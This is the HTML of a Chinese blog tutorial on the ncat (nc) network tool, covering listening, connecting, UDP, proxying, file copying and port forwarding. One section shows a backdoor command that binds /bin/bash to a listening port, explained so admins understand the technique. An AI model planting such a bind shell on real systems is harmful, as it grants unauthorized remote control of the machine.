@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='教你如何使用ncat'><title>ncat(nc) 命令使用方法</title>
+
+<link rel='canonical' href='https://skyaerope.github.io/p/ncat/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='ncat(nc) 命令使用方法'>
+<meta property='og:description' content='教你如何使用ncat'>
+<meta property='og:url' content='https://skyaerope.github.io/p/ncat/'>
+<meta property='og:site_name' content='薄荷布丁'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='教程' /><meta property='article:published_time' content='2021-11-13T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-11-13T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="ncat(nc) 命令使用方法">
+<meta name="twitter:description" content="教你如何使用ncat">
+    <link rel="shortcut icon" href="https://box.sllzy.top/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="https://skyaerope.github.io" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%95%99%E7%A8%8B/" >
+                教程
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/ncat/">ncat(nc) 命令使用方法</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        教你如何使用ncat
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Nov 13, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p><code>ncat</code> 或者说 <code>nc</code> 是一款功能类似 <code>cat</code> 的工具，但是是用于网络的。它是一款拥有多种功能的 <code>CLI</code> 工具，可以用来在网络上读、写以及重定向数据。 它被设计成可以被脚本或其他程序调用的可靠的后端工具。同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。</p>
+<p><code>ncat</code>/<code>nc</code> 既是一个端口扫描工具，也是一款安全工具，还是一款监测工具，甚至可以做为一个简单的 <code>TCP</code> 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀。 这是每个系统管理员都应该知道并且掌握它。</p>
+<p>在大多数 <code>Debian</code> 发行版中，<code>nc</code> 是默认可用的，它会在安装系统的过程中自动被安装。 但是在 <code>CentOS 7/RHEL 7</code> 的最小化安装中，<code>nc</code> 并不会默认被安装。 你需要用下列命令手工安装。</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">yum install nmap-ncat -y
+</code></pre></div><p>系统管理员可以用它来审计系统安全，用它来找出开放的端口然后保护这些端口。 管理员还能用它作为客户端来审计 <code>Web</code> 服务器、<code>telnet</code> 服务器、邮件服务器等， 通过 <code>nc</code> 我们可以控制发送的每个字符，也可以查看对方的回应。</p>
+<p>我们还可以用它捕获客户端发送的数据以此来了解这些客户端是做什么的。</p>
+<p>在本文中，我们会通过下面这些例子来学习如何使用 <code>nc</code> 命令。</p>
+<h3 id="1-监听入站连接">1) 监听入站连接</h3>
+<p>通过 <code>-l</code> 选项，<code>ncat</code> 可以进入监听模式，使我们可以在指定端口监听入站连接。 完整的命令是这样的：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -l port_number
+</code></pre></div><p>比如</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -l <span class="m">8080</span>
+</code></pre></div><p>服务器就会开始在 <code>8080</code> 端口监听入站连接。</p>
+<h3 id="2-连接远程系统">2) 连接远程系统</h3>
+<p>使用下面命令可以用 <code>nc</code> 来连接远程系统</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat IP_address port_number
+</code></pre></div><p>我们来看个例子</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat 192.168.1.100 <span class="m">80</span>
+</code></pre></div><p>这会创建一个连接，连接到 IP 为 <code>192.168.1.100</code> 的服务器上的 <code>80</code> 端口，然后我们就可以向服务器发送指令了。 比如我们可以输入下面内容来获取完整的网页内容</p>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div><p>或者获取页面名称</p>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div><p>或者我们可以通过以下方式获得操作系统指纹标识</p>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">HEAD</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div><p>这会告诉我们使用的是什么软件来运行这个 <code>web</code> 服务器的</p>
+<h3 id="3-连接-udp-端口">3) 连接 UDP 端口</h3>
+<p>默认情况下，<code>nc</code> 创建连接时只会连接 <code>TCP</code> 端口。 不过我们可以使用 <code>-u</code> 选项来连接到 <code>UDP</code> 端口</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -l -u <span class="m">1234</span>
+</code></pre></div><p>现在我们的系统会开始监听 <code>UDP</code> 的 <code>1234</code> 端口，我们可以使用下面的 <code>netstat</code> 命令来验证这一点</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">netstat -tunlp <span class="p">|</span> grep <span class="m">1234</span>
+udp           <span class="m">0</span>          <span class="m">0</span> 0.0.0.0:1234                 0.0.0.0:*               17341/nc
+udp6          <span class="m">0</span>          <span class="m">0</span> :::1234                      :::*                    17341/nc
+</code></pre></div><p>假设我们想发送或者说测试某个远程主机 <code>UDP</code> 端口的连通性，我们可以使用下面命令</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -v -u <span class="o">{</span>host-ip<span class="o">}</span> <span class="o">{</span>udp-port<span class="o">}</span>
+</code></pre></div><p>比如</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -v -u 192.168.105.150 <span class="m">53</span>
+Ncat: Version 6.40 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
+Ncat: Connected to 192.168.105.150:53
+</code></pre></div><h3 id="4-将-nc-作为聊天工具">4) 将 <code>nc</code> 作为聊天工具</h3>
+<p><code>nc</code> 也可以作为聊天工具来用，我们可以配置服务器监听某个端口，然后从远程主机上连接到服务器的这个端口，就可以开始发送消息了。 在服务器这端运行：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -l <span class="m">8080</span>
+</code></pre></div><p>在远程客户端主机上运行：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat 192.168.1.100 <span class="m">8080</span>
+</code></pre></div><p>之后开始发送消息，这些消息会在服务器终端上显示出来。</p>
+<h3 id="5-将-nc-作为代理">5) 将 <code>nc</code> 作为代理</h3>
+<p><code>nc</code> 也可以用来做代理。比如下面这个例子</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -l <span class="m">8080</span> <span class="p">|</span> ncat 192.168.1.200 <span class="m">80</span>
+</code></pre></div><p>所有发往我们服务器 <code>8080</code> 端口的连接都会自动转发到 <code>192.168.1.200</code> 上的 <code>80</code> 端口。 不过由于我们使用了管道，数据只能被单向传输。 要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">mkfifo 2way
+ncat -l <span class="m">8080</span> 0&lt;2way <span class="p">|</span> ncat 192.168.1.200 <span class="m">80</span> 1&gt;2way
+</code></pre></div><p>现在你可以通过 <code>nc</code> 代理来收发数据了</p>
+<h3 id="6-使用-nc-拷贝文件">6) 使用 <code>nc</code> 拷贝文件</h3>
+<p><code>nc</code> 还能用来在系统间拷贝文件，虽然这么做并不推荐，因为绝大多数系统默认都安装了 <code>ssh</code>/<code>scp</code>。 不过如果你恰好遇见个没有 <code>ssh</code>/<code>scp</code> 的系统的话， 你可以用 <code>nc</code> 来作最后的努力。</p>
+<p>在要接受数据的机器上启动 <code>nc</code> 并让它进入监听模式：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -l  <span class="m">8080</span> &gt; file.txt
+</code></pre></div><p>现在去要被拷贝数据的机器上运行下面命令：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat 192.168.1.100 <span class="m">8080</span> --send-only &lt; data.txt
+</code></pre></div><p>这里，<code>data.txt</code> 是要发送的文件。 <code>-–send-only</code> 选项会在文件拷贝完后立即关闭连接。 如果不加该选项， 我们需要手工按下 <code>ctrl+c</code> 来关闭连接。</p>
+<p>我们也可以用这种方法拷贝整个磁盘分区，不过请一定要小心</p>
+<h3 id="7-通过-nc-创建后门">7) 通过 <code>nc</code> 创建后门</h3>
+<p><code>nc</code> 命令还可以用来在系统中创建后门，并且这种技术也确实被黑客大量使用。 为了保护我们的系统，我们需要知道它是怎么做的。 创建后门的命令为：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -l <span class="m">10000</span> -e /bin/bash
+</code></pre></div><p><code>-e</code> 标志将一个 <code>bash</code> 与端口 <code>10000</code> 相连。现在客户端只要连接到服务器上的 <code>10000</code> 端口就能通过 <code>bash</code> 获取我们系统的完整访问权限：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat 192.168.1.100 <span class="m">10000</span>
+</code></pre></div><h3 id="8-通过-nc-进行端口转发">8) 通过 <code>nc</code> 进行端口转发</h3>
+<p>我们通过选项 <code>-c</code> 来用 <code>nc</code> 进行端口转发，实现端口转发的语法为：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -u -l  <span class="m">80</span> -c  <span class="s1">&#39;ncat -u -l 8080&#39;</span>
+</code></pre></div><p>这样，所有连接到 <code>80</code> 端口的连接都会转发到 <code>8080</code> 端口</p>
+<h3 id="9-设置连接超时">9) 设置连接超时</h3>
+<p><code>nc</code> 的监听模式会一直运行，直到手工终止。 不过我们可以通过选项 <code>-w</code> 设置超时时间:</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -w <span class="m">10</span> 192.168.1.100 <span class="m">8080</span>
+</code></pre></div><p>这会导致连接 <code>10</code> 秒后终止，不过这个选项只能用于客户端而不是服务端。</p>
+<h3 id="10-使用--k-选项强制-nc-待命">10) 使用 <code>-k</code> 选项强制 <code>nc</code> 待命</h3>
+<p>当客户端从服务端断开连接后，过一段时间服务端也会停止监听。 但通过选项 <code>-k</code> 我们可以强制服务器保持连接并继续监听端口。 命令如下：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ncat -l -k <span class="m">8080</span>
+</code></pre></div><p>现在即使来自客户端的连接断了也依然会处于待命状态</p>
+<blockquote>
+<p>本文由 <a class="link" href="http://ksria.com/simpread/"  target="_blank" rel="noopener"
+    >简悦 SimpRead</a> 转码， 原文地址 <a class="link" href="https://www.cnblogs.com/ECJTUACM-873284962/p/9712882.html"  target="_blank" rel="noopener"
+    >www.cnblogs.com</a></p>
+</blockquote>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/linux/">Linux</a>
+        
+            <a href="/tags/%E6%95%99%E7%A8%8B/">教程</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3&#43;Aro6EYUG4&#43;cU&#43;KJWu/X"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"integrity="sha384-g7c&#43;Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI&#43;sEnkvrMWph2EDg4"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC&#43;Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/linux-apt-error/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Linux 报错 Certificate verification failed The certificate is NOT trusted.</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/linux-bucket/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Linux中的虚拟设备/dev/null、/dev/zero、/dev/random和/dev/urandom</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/shell-chinese/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">shell 中改语言为中文</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/dstcrockpot/">
+        
+        
+            <div class="article-image">
+                <img src="/p/dstcrockpot/00.bf744c9169afd89aa7eaa9cedd7191b7_hu59df01dd9cfb485ca1960cb6f6bf535d_181785_250x150_fill_box_smart1_2.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="dstcrockpot" 
+                        data-hash="md5-v3RMkWmv2Jqn6qnO3XGRtw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">烹饪锅食谱</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/dstcmd/">
+        
+        
+            <div class="article-image">
+                <img src="/p/dstcmd/00.f93e76c6db2b3e0c0d927428570cfdeb_hu98af69dd04e5bb722241122ff4aea059_205115_250x150_fill_box_smart1_2.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="dstcmd" 
+                        data-hash="md5-&#43;T52xtsrPgwNknQoVwz96w==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">饥荒联机版中的命令</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+     
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 薄荷布丁
+    </section>
+    
+    <section class="powerby">
+        
+            <a href="https://icp.gov.moe/?keyword=20212100" target="_blank">萌ICP备20212100号</a> <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#1-监听入站连接">1) 监听入站连接</a></li>
+        <li><a href="#2-连接远程系统">2) 连接远程系统</a></li>
+        <li><a href="#3-连接-udp-端口">3) 连接 UDP 端口</a></li>
+        <li><a href="#4-将-nc-作为聊天工具">4) 将 <code>nc</code> 作为聊天工具</a></li>
+        <li><a href="#5-将-nc-作为代理">5) 将 <code>nc</code> 作为代理</a></li>
+        <li><a href="#6-使用-nc-拷贝文件">6) 使用 <code>nc</code> 拷贝文件</a></li>
+        <li><a href="#7-通过-nc-创建后门">7) 通过 <code>nc</code> 创建后门</a></li>
+        <li><a href="#8-通过-nc-进行端口转发">8) 通过 <code>nc</code> 进行端口转发</a></li>
+        <li><a href="#9-设置连接超时">9) 设置连接超时</a></li>
+        <li><a href="#10-使用--k-选项强制-nc-待命">10) 使用 <code>-k</code> 选项强制 <code>nc</code> 待命</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
